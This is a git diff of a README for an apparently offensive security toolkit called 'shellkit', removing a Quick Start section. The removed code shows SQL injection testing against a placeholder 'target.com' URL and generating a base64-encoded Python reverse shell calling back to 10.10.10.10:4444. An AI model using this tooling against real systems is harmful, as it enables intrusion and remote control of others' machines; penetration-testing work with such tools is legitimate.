@@ -53,34 +53,6 @@ pip install -r requirements.txt
 
 ```
 
-## 🎮 Quick Start
-
-```python
-from shellkit.sql_injection import SQLInjector
-from shellkit.shells import ReverseShellGenerator
-from shellkit.encoders import Base64ShellEncoder
-
-# SQL Injection Example
-injector = SQLInjector()
-result = injector.test_injection(
-    url="http://target.com/vulnerable.php",
-    parameter="id",
-    technique="boolean"
-)
-
-# Generate an Encoded Reverse Shell
-generator = ReverseShellGenerator()
-encoder = Base64ShellEncoder()
-
-shell = generator.generate(
-    language="python",
-    ip="10.10.10.10",
-    port=4444
-)
-
-encoded_shell = encoder.encode(shell)
-```
-
 ## 📚 Documentation
 
 Detailed documentation is available at [docs/](docs/).
